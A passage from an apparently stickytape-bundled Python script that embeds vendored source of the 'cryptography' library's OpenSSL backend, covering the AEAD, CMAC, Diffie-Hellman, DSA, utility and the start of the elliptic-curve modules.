typing.Optional[typing.List[bytes]],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = []\r\n\r\n        self._check_params(data, associated_data)\r\n\r\n        if len(data) > self._MAX_SIZE or any(\r\n            len(ad) > self._MAX_SIZE for ad in associated_data\r\n        ):\r\n            # This is OverflowError to match what cffi would raise\r\n            raise OverflowError(\r\n                "Data or associated data too long. Max 2**31 - 1 bytes"\r\n            )\r\n\r\n        return aead._encrypt(backend, self, b"", data, associated_data, 16)\r\n\r\n    def decrypt(\r\n        self,\r\n        data: bytes,\r\n        associated_data: typing.Optional[typing.List[bytes]],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = []\r\n\r\n        self._check_params(data, associated_data)\r\n\r\n        return aead._decrypt(backend, self, b"", data, associated_data, 16)\r\n\r\n    def _check_params(\r\n        self,\r\n        data: bytes,\r\n        associated_data: typing.List,\r\n    ) -> None:\r\n        utils._check_bytes("data", data)\r\n        if not isinstance(associated_data, list) or not all(\r\n            isinstance(x, bytes) for x in associated_data\r\n        ):\r\n            raise TypeError("associated_data must be a list of bytes or None")\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/cmac.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import (\r\n    InvalidSignature,\r\n    UnsupportedAlgorithm,\r\n    _Reasons,\r\n)\r\nfrom cryptography.hazmat.primitives import constant_time\r\nfrom cryptography.hazmat.primitives.ciphers.modes import CBC\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.primitives import ciphers\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _CMACContext:\r\n    def __init__(\r\n        self,\r\n        backend: "Backend",\r\n        algorithm: "ciphers.BlockCipherAlgorithm",\r\n        ctx=None,\r\n    ) -> None:\r\n        if not backend.cmac_algorithm_supported(algorithm):\r\n            raise UnsupportedAlgorithm(\r\n                "This backend does not support CMAC.",\r\n                _Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n\r\n        self._backend = backend\r\n        self._key = algorithm.key\r\n        self._algorithm = algorithm\r\n        self._output_length = algorithm.block_size // 8\r\n\r\n        if ctx is None:\r\n            registry = self._backend._cipher_registry\r\n            adapter = registry[type(algorithm), CBC]\r\n\r\n            evp_cipher = adapter(self._backend, algorithm, CBC)\r\n\r\n            ctx = self._backend._lib.CMAC_CTX_new()\r\n\r\n            self._backend.openssl_assert(ctx != self._backend._ffi.NULL)\r\n            ctx = self._backend._ffi.gc(ctx, self._backend._lib.CMAC_CTX_free)\r\n\r\n            key_ptr = self._backend._ffi.from_buffer(self._key)\r\n            res = self._backend._lib.CMAC_Init(\r\n                ctx,\r\n                key_ptr,\r\n                len(self._key),\r\n                evp_cipher,\r\n                self._backend._ffi.NULL,\r\n            )\r\n            self._backend.openssl_assert(res == 1)\r\n\r\n        self._ctx = ctx\r\n\r\n    def update(self, data: bytes) -> None:\r\n        res = self._backend._lib.CMAC_Update(self._ctx, data, len(data))\r\n        self._backend.openssl_assert(res == 1)\r\n\r\n    def finalize(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char[]", self._output_length)\r\n        length = self._backend._ffi.new("size_t *", self._output_length)\r\n        res = self._backend._lib.CMAC_Final(self._ctx, buf, length)\r\n        self._backend.openssl_assert(res == 1)\r\n\r\n        self._ctx = None\r\n\r\n        return self._backend._ffi.buffer(buf)[:]\r\n\r\n    def copy(self) -> "_CMACContext":\r\n        copied_ctx = self._backend._lib.CMAC_CTX_new()\r\n        copied_ctx = self._backend._ffi.gc(\r\n            copied_ctx, self._backend._lib.CMAC_CTX_free\r\n        )\r\n        res = self._backend._lib.CMAC_CTX_copy(copied_ctx, self._ctx)\r\n        self._backend.openssl_assert(res == 1)\r\n        return _CMACContext(self._backend, self._algorithm, ctx=copied_ctx)\r\n\r\n    def verify(self, signature: bytes) -> None:\r\n        digest = self.finalize()\r\n        if not constant_time.bytes_eq(digest, signature):\r\n            raise InvalidSignature("Signature did not match digest.")\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/dh.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import dh\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\ndef _dh_params_dup(dh_cdata, backend: "Backend"):\r\n    lib = backend._lib\r\n    ffi = backend._ffi\r\n\r\n    param_cdata = lib.DHparams_dup(dh_cdata)\r\n    backend.openssl_assert(param_cdata != ffi.NULL)\r\n    param_cdata = ffi.gc(param_cdata, lib.DH_free)\r\n    if lib.CRYPTOGRAPHY_IS_LIBRESSL:\r\n        # In libressl DHparams_dup don\'t copy q\r\n        q = ffi.new("BIGNUM **")\r\n        lib.DH_get0_pqg(dh_cdata, ffi.NULL, q, ffi.NULL)\r\n        q_dup = lib.BN_dup(q[0])\r\n        res = lib.DH_set0_pqg(param_cdata, ffi.NULL, q_dup, ffi.NULL)\r\n        backend.openssl_assert(res == 1)\r\n\r\n    return param_cdata\r\n\r\n\r\ndef _dh_cdata_to_parameters(dh_cdata, backend: "Backend") -> "_DHParameters":\r\n    param_cdata = _dh_params_dup(dh_cdata, backend)\r\n    return _DHParameters(backend, param_cdata)\r\n\r\n\r\nclass _DHParameters(dh.DHParameters):\r\n    def __init__(self, backend: "Backend", dh_cdata):\r\n        self._backend = backend\r\n        self._dh_cdata = dh_cdata\r\n\r\n    def parameter_numbers(self) -> dh.DHParameterNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_pqg(self._dh_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        q_val: typing.Optional[int]\r\n        if q[0] == self._backend._ffi.NULL:\r\n            q_val = None\r\n        else:\r\n            q_val = self._backend._bn_to_int(q[0])\r\n        return dh.DHParameterNumbers(\r\n            p=self._backend._bn_to_int(p[0]),\r\n            g=self._backend._bn_to_int(g[0]),\r\n            q=q_val,\r\n        )\r\n\r\n    def generate_private_key(self) -> dh.DHPrivateKey:\r\n        return self._backend.generate_dh_private_key(self)\r\n\r\n    def parameter_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.ParameterFormat,\r\n    ) -> bytes:\r\n        if encoding is serialization.Encoding.OpenSSH:\r\n            raise TypeError("OpenSSH encoding is not supported")\r\n\r\n        if format is not serialization.ParameterFormat.PKCS3:\r\n            raise ValueError("Only PKCS3 serialization is supported")\r\n\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_pqg(\r\n            self._dh_cdata, self._backend._ffi.NULL, q, self._backend._ffi.NULL\r\n        )\r\n        if (\r\n            q[0] != self._backend._ffi.NULL\r\n            and not self._backend._lib.Cryptography_HAS_EVP_PKEY_DHX\r\n        ):\r\n            raise UnsupportedAlgorithm(\r\n                "DH X9.42 serialization is not supported",\r\n                _Reasons.UNSUPPORTED_SERIALIZATION,\r\n            )\r\n\r\n        if encoding is serialization.Encoding.PEM:\r\n            if q[0] != self._backend._ffi.NULL:\r\n                write_bio = self._backend._lib.PEM_write_bio_DHxparams\r\n            else:\r\n                write_bio = self._backend._lib.PEM_write_bio_DHparams\r\n        elif encoding is serialization.Encoding.DER:\r\n            if q[0] != self._backend._ffi.NULL:\r\n                write_bio = self._backend._lib.Cryptography_i2d_DHxparams_bio\r\n            else:\r\n                write_bio = self._backend._lib.i2d_DHparams_bio\r\n        else:\r\n            raise TypeError("encoding must be an item from the Encoding enum")\r\n\r\n        bio = self._backend._create_mem_bio_gc()\r\n        res = write_bio(bio, self._dh_cdata)\r\n        self._backend.openssl_assert(res == 1)\r\n        return self._backend._read_mem_bio(bio)\r\n\r\n\r\ndef _get_dh_num_bits(backend, dh_cdata) -> int:\r\n    p = backend._ffi.new("BIGNUM **")\r\n    backend._lib.DH_get0_pqg(dh_cdata, p, backend._ffi.NULL, backend._ffi.NULL)\r\n    backend.openssl_assert(p[0] != backend._ffi.NULL)\r\n    return backend._lib.BN_num_bits(p[0])\r\n\r\n\r\nclass _DHPrivateKey(dh.DHPrivateKey):\r\n    def __init__(self, backend: "Backend", dh_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._dh_cdata = dh_cdata\r\n        self._evp_pkey = evp_pkey\r\n        self._key_size_bytes = self._backend._lib.DH_size(dh_cdata)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return _get_dh_num_bits(self._backend, self._dh_cdata)\r\n\r\n    def private_numbers(self) -> dh.DHPrivateNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_pqg(self._dh_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        if q[0] == self._backend._ffi.NULL:\r\n            q_val = None\r\n        else:\r\n            q_val = self._backend._bn_to_int(q[0])\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        priv_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_key(self._dh_cdata, pub_key, priv_key)\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(priv_key[0] != self._backend._ffi.NULL)\r\n        return dh.DHPrivateNumbers(\r\n            public_numbers=dh.DHPublicNumbers(\r\n                parameter_numbers=dh.DHParameterNumbers(\r\n                    p=self._backend._bn_to_int(p[0]),\r\n                    g=self._backend._bn_to_int(g[0]),\r\n                    q=q_val,\r\n                ),\r\n                y=self._backend._bn_to_int(pub_key[0]),\r\n            ),\r\n            x=self._backend._bn_to_int(priv_key[0]),\r\n        )\r\n\r\n    def exchange(self, peer_public_key: dh.DHPublicKey) -> bytes:\r\n        if not isinstance(peer_public_key, _DHPublicKey):\r\n            raise TypeError("peer_public_key must be a DHPublicKey")\r\n\r\n        ctx = self._backend._lib.EVP_PKEY_CTX_new(\r\n            self._evp_pkey, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(ctx != self._backend._ffi.NULL)\r\n        ctx = self._backend._ffi.gc(ctx, self._backend._lib.EVP_PKEY_CTX_free)\r\n        res = self._backend._lib.EVP_PKEY_derive_init(ctx)\r\n        self._backend.openssl_assert(res == 1)\r\n        res = self._backend._lib.EVP_PKEY_derive_set_peer(\r\n            ctx, peer_public_key._evp_pkey\r\n        )\r\n        # Invalid kex errors here in OpenSSL 3.0 because checks were moved\r\n        # to EVP_PKEY_derive_set_peer\r\n        self._exchange_assert(res == 1)\r\n        keylen = self._backend._ffi.new("size_t *")\r\n        res = self._backend._lib.EVP_PKEY_derive(\r\n            ctx, self._backend._ffi.NULL, keylen\r\n        )\r\n        # Invalid kex errors here in OpenSSL < 3\r\n        self._exchange_assert(res == 1)\r\n        self._backend.openssl_assert(keylen[0] > 0)\r\n        buf = self._backend._ffi.new("unsigned char[]", keylen[0])\r\n        res = self._backend._lib.EVP_PKEY_derive(ctx, buf, keylen)\r\n        self._backend.openssl_assert(res == 1)\r\n\r\n        key = self._backend._ffi.buffer(buf, keylen[0])[:]\r\n        pad = self._key_size_bytes - len(key)\r\n\r\n        if pad > 0:\r\n            key = (b"\\x00" * pad) + key\r\n\r\n        return key\r\n\r\n    def _exchange_assert(self, ok: bool) -> None:\r\n        if not ok:\r\n            errors_with_text = self._backend._consume_errors_with_text()\r\n            raise ValueError(\r\n                "Error computing shared key.",\r\n                errors_with_text,\r\n            )\r\n\r\n    def public_key(self) -> dh.DHPublicKey:\r\n        dh_cdata = _dh_params_dup(self._dh_cdata, self._backend)\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_key(\r\n            self._dh_cdata, pub_key, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        pub_key_dup = self._backend._lib.BN_dup(pub_key[0])\r\n        self._backend.openssl_assert(pub_key_dup != self._backend._ffi.NULL)\r\n\r\n        res = self._backend._lib.DH_set0_key(\r\n            dh_cdata, pub_key_dup, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        evp_pkey = self._backend._dh_cdata_to_evp_pkey(dh_cdata)\r\n        return _DHPublicKey(self._backend, dh_cdata, evp_pkey)\r\n\r\n    def parameters(self) -> dh.DHParameters:\r\n        return _dh_cdata_to_parameters(self._dh_cdata, self._backend)\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        if format is not serialization.PrivateFormat.PKCS8:\r\n            raise ValueError(\r\n                "DH private keys support only PKCS8 serialization"\r\n            )\r\n        if not self._backend._lib.Cryptography_HAS_EVP_PKEY_DHX:\r\n            q = self._backend._ffi.new("BIGNUM **")\r\n            self._backend._lib.DH_get0_pqg(\r\n                self._dh_cdata,\r\n                self._backend._ffi.NULL,\r\n                q,\r\n                self._backend._ffi.NULL,\r\n            )\r\n            if q[0] != self._backend._ffi.NULL:\r\n                raise UnsupportedAlgorithm(\r\n                    "DH X9.42 serialization is not supported",\r\n                    _Reasons.UNSUPPORTED_SERIALIZATION,\r\n                )\r\n\r\n        return self._backend._private_key_bytes(\r\n            encoding,\r\n            format,\r\n            encryption_algorithm,\r\n            self,\r\n            self._evp_pkey,\r\n            self._dh_cdata,\r\n        )\r\n\r\n\r\nclass _DHPublicKey(dh.DHPublicKey):\r\n    def __init__(self, backend: "Backend", dh_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._dh_cdata = dh_cdata\r\n        self._evp_pkey = evp_pkey\r\n        self._key_size_bits = _get_dh_num_bits(self._backend, self._dh_cdata)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self._key_size_bits\r\n\r\n    def public_numbers(self) -> dh.DHPublicNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_pqg(self._dh_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        if q[0] == self._backend._ffi.NULL:\r\n            q_val = None\r\n        else:\r\n            q_val = self._backend._bn_to_int(q[0])\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DH_get0_key(\r\n            self._dh_cdata, pub_key, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        return dh.DHPublicNumbers(\r\n            parameter_numbers=dh.DHParameterNumbers(\r\n                p=self._backend._bn_to_int(p[0]),\r\n                g=self._backend._bn_to_int(g[0]),\r\n                q=q_val,\r\n            ),\r\n            y=self._backend._bn_to_int(pub_key[0]),\r\n        )\r\n\r\n    def parameters(self) -> dh.DHParameters:\r\n        return _dh_cdata_to_parameters(self._dh_cdata, self._backend)\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if format is not serialization.PublicFormat.SubjectPublicKeyInfo:\r\n            raise ValueError(\r\n                "DH public keys support only "\r\n                "SubjectPublicKeyInfo serialization"\r\n            )\r\n\r\n        if not self._backend._lib.Cryptography_HAS_EVP_PKEY_DHX:\r\n            q = self._backend._ffi.new("BIGNUM **")\r\n            self._backend._lib.DH_get0_pqg(\r\n                self._dh_cdata,\r\n                self._backend._ffi.NULL,\r\n                q,\r\n                self._backend._ffi.NULL,\r\n            )\r\n            if q[0] != self._backend._ffi.NULL:\r\n                raise UnsupportedAlgorithm(\r\n                    "DH X9.42 serialization is not supported",\r\n                    _Reasons.UNSUPPORTED_SERIALIZATION,\r\n                )\r\n\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/dsa.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import InvalidSignature\r\nfrom cryptography.hazmat.backends.openssl.utils import (\r\n    _calculate_digest_and_algorithm,\r\n)\r\nfrom cryptography.hazmat.primitives import hashes, serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    dsa,\r\n    utils as asym_utils,\r\n)\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\ndef _dsa_sig_sign(\r\n    backend: "Backend", private_key: "_DSAPrivateKey", data: bytes\r\n) -> bytes:\r\n    sig_buf_len = backend._lib.DSA_size(private_key._dsa_cdata)\r\n    sig_buf = backend._ffi.new("unsigned char[]", sig_buf_len)\r\n    buflen = backend._ffi.new("unsigned int *")\r\n\r\n    # The first parameter passed to DSA_sign is unused by OpenSSL but\r\n    # must be an integer.\r\n    res = backend._lib.DSA_sign(\r\n        0, data, len(data), sig_buf, buflen, private_key._dsa_cdata\r\n    )\r\n    backend.openssl_assert(res == 1)\r\n    backend.openssl_assert(buflen[0])\r\n\r\n    return backend._ffi.buffer(sig_buf)[: buflen[0]]\r\n\r\n\r\ndef _dsa_sig_verify(\r\n    backend: "Backend",\r\n    public_key: "_DSAPublicKey",\r\n    signature: bytes,\r\n    data: bytes,\r\n) -> None:\r\n    # The first parameter passed to DSA_verify is unused by OpenSSL but\r\n    # must be an integer.\r\n    res = backend._lib.DSA_verify(\r\n        0, data, len(data), signature, len(signature), public_key._dsa_cdata\r\n    )\r\n\r\n    if res != 1:\r\n        backend._consume_errors()\r\n        raise InvalidSignature\r\n\r\n\r\nclass _DSAParameters(dsa.DSAParameters):\r\n    def __init__(self, backend: "Backend", dsa_cdata):\r\n        self._backend = backend\r\n        self._dsa_cdata = dsa_cdata\r\n\r\n    def parameter_numbers(self) -> dsa.DSAParameterNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_pqg(self._dsa_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(q[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        return dsa.DSAParameterNumbers(\r\n            p=self._backend._bn_to_int(p[0]),\r\n            q=self._backend._bn_to_int(q[0]),\r\n            g=self._backend._bn_to_int(g[0]),\r\n        )\r\n\r\n    def generate_private_key(self) -> dsa.DSAPrivateKey:\r\n        return self._backend.generate_dsa_private_key(self)\r\n\r\n\r\nclass _DSAPrivateKey(dsa.DSAPrivateKey):\r\n    _key_size: int\r\n\r\n    def __init__(self, backend: "Backend", dsa_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._dsa_cdata = dsa_cdata\r\n        self._evp_pkey = evp_pkey\r\n\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_pqg(\r\n            dsa_cdata, p, self._backend._ffi.NULL, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(p[0] != backend._ffi.NULL)\r\n        self._key_size = self._backend._lib.BN_num_bits(p[0])\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self._key_size\r\n\r\n    def private_numbers(self) -> dsa.DSAPrivateNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        priv_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_pqg(self._dsa_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(q[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        self._backend._lib.DSA_get0_key(self._dsa_cdata, pub_key, priv_key)\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(priv_key[0] != self._backend._ffi.NULL)\r\n        return dsa.DSAPrivateNumbers(\r\n            public_numbers=dsa.DSAPublicNumbers(\r\n                parameter_numbers=dsa.DSAParameterNumbers(\r\n                    p=self._backend._bn_to_int(p[0]),\r\n                    q=self._backend._bn_to_int(q[0]),\r\n                    g=self._backend._bn_to_int(g[0]),\r\n                ),\r\n                y=self._backend._bn_to_int(pub_key[0]),\r\n            ),\r\n            x=self._backend._bn_to_int(priv_key[0]),\r\n        )\r\n\r\n    def public_key(self) -> dsa.DSAPublicKey:\r\n        dsa_cdata = self._backend._lib.DSAparams_dup(self._dsa_cdata)\r\n        self._backend.openssl_assert(dsa_cdata != self._backend._ffi.NULL)\r\n        dsa_cdata = self._backend._ffi.gc(\r\n            dsa_cdata, self._backend._lib.DSA_free\r\n        )\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_key(\r\n            self._dsa_cdata, pub_key, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        pub_key_dup = self._backend._lib.BN_dup(pub_key[0])\r\n        res = self._backend._lib.DSA_set0_key(\r\n            dsa_cdata, pub_key_dup, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        evp_pkey = self._backend._dsa_cdata_to_evp_pkey(dsa_cdata)\r\n        return _DSAPublicKey(self._backend, dsa_cdata, evp_pkey)\r\n\r\n    def parameters(self) -> dsa.DSAParameters:\r\n        dsa_cdata = self._backend._lib.DSAparams_dup(self._dsa_cdata)\r\n        self._backend.openssl_assert(dsa_cdata != self._backend._ffi.NULL)\r\n        dsa_cdata = self._backend._ffi.gc(\r\n            dsa_cdata, self._backend._lib.DSA_free\r\n        )\r\n        return _DSAParameters(self._backend, dsa_cdata)\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        return self._backend._private_key_bytes(\r\n            encoding,\r\n            format,\r\n            encryption_algorithm,\r\n            self,\r\n            self._evp_pkey,\r\n            self._dsa_cdata,\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        data, _ = _calculate_digest_and_algorithm(data, algorithm)\r\n        return _dsa_sig_sign(self._backend, self, data)\r\n\r\n\r\nclass _DSAPublicKey(dsa.DSAPublicKey):\r\n    _key_size: int\r\n\r\n    def __init__(self, backend: "Backend", dsa_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._dsa_cdata = dsa_cdata\r\n        self._evp_pkey = evp_pkey\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_pqg(\r\n            dsa_cdata, p, self._backend._ffi.NULL, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(p[0] != backend._ffi.NULL)\r\n        self._key_size = self._backend._lib.BN_num_bits(p[0])\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self._key_size\r\n\r\n    def public_numbers(self) -> dsa.DSAPublicNumbers:\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        g = self._backend._ffi.new("BIGNUM **")\r\n        pub_key = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.DSA_get0_pqg(self._dsa_cdata, p, q, g)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(q[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(g[0] != self._backend._ffi.NULL)\r\n        self._backend._lib.DSA_get0_key(\r\n            self._dsa_cdata, pub_key, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(pub_key[0] != self._backend._ffi.NULL)\r\n        return dsa.DSAPublicNumbers(\r\n            parameter_numbers=dsa.DSAParameterNumbers(\r\n                p=self._backend._bn_to_int(p[0]),\r\n                q=self._backend._bn_to_int(q[0]),\r\n                g=self._backend._bn_to_int(g[0]),\r\n            ),\r\n            y=self._backend._bn_to_int(pub_key[0]),\r\n        )\r\n\r\n    def parameters(self) -> dsa.DSAParameters:\r\n        dsa_cdata = self._backend._lib.DSAparams_dup(self._dsa_cdata)\r\n        dsa_cdata = self._backend._ffi.gc(\r\n            dsa_cdata, self._backend._lib.DSA_free\r\n        )\r\n        return _DSAParameters(self._backend, dsa_cdata)\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> None:\r\n        data, _ = _calculate_digest_and_algorithm(data, algorithm)\r\n        return _dsa_sig_verify(self._backend, self, signature, data)\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/utils.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric.utils import Prehashed\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\ndef _evp_pkey_derive(backend: "Backend", evp_pkey, peer_public_key) -> bytes:\r\n    ctx = backend._lib.EVP_PKEY_CTX_new(evp_pkey, backend._ffi.NULL)\r\n    backend.openssl_assert(ctx != backend._ffi.NULL)\r\n    ctx = backend._ffi.gc(ctx, backend._lib.EVP_PKEY_CTX_free)\r\n    res = backend._lib.EVP_PKEY_derive_init(ctx)\r\n    backend.openssl_assert(res == 1)\r\n    res = backend._lib.EVP_PKEY_derive_set_peer(ctx, peer_public_key._evp_pkey)\r\n    backend.openssl_assert(res == 1)\r\n    keylen = backend._ffi.new("size_t *")\r\n    res = backend._lib.EVP_PKEY_derive(ctx, backend._ffi.NULL, keylen)\r\n    backend.openssl_assert(res == 1)\r\n    backend.openssl_assert(keylen[0] > 0)\r\n    buf = backend._ffi.new("unsigned char[]", keylen[0])\r\n    res = backend._lib.EVP_PKEY_derive(ctx, buf, keylen)\r\n    if res != 1:\r\n        errors_with_text = backend._consume_errors_with_text()\r\n        raise ValueError("Error computing shared key.", errors_with_text)\r\n\r\n    return backend._ffi.buffer(buf, keylen[0])[:]\r\n\r\n\r\ndef _calculate_digest_and_algorithm(\r\n    data: bytes,\r\n    algorithm: typing.Union[Prehashed, hashes.HashAlgorithm],\r\n) -> typing.Tuple[bytes, hashes.HashAlgorithm]:\r\n    if not isinstance(algorithm, Prehashed):\r\n        hash_ctx = hashes.Hash(algorithm)\r\n        hash_ctx.update(data)\r\n        data = hash_ctx.finalize()\r\n    else:\r\n        algorithm = algorithm._algorithm\r\n\r\n    if len(data) != algorithm.digest_size:\r\n        raise ValueError(\r\n            "The provided data must be the same length as the hash "\r\n            "algorithm\'s digest size."\r\n        )\r\n\r\n    return (data, algorithm)\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/ec.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import (\r\n    InvalidSignature,\r\n    UnsupportedAlgorithm,\r\n    _Reasons,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.utils import (\r\n    _calculate_digest_and_algorithm,\r\n    _evp_pkey_derive,\r\n)\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\ndef _check_signature_algorithm(\r\n    signature_algorithm: ec.EllipticCurveSignatureAlgorithm,\r\n) -> None:\r\n    if not isinstance(signature_algorithm, ec.ECDSA):\r\n        raise UnsupportedAlgorithm(\r\n            "Unsupported elliptic curve signature algorithm.",\r\n            _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n        )\r\n\r\n\r\ndef _ec_key_curve_sn(backend: "Backend", ec_key) -> str:\r\n    group = backend._lib.EC_KEY_get0_group(ec_key)\r\n    backend.openssl_assert(group != backend._ffi.NULL)\r\n\r\n    nid = 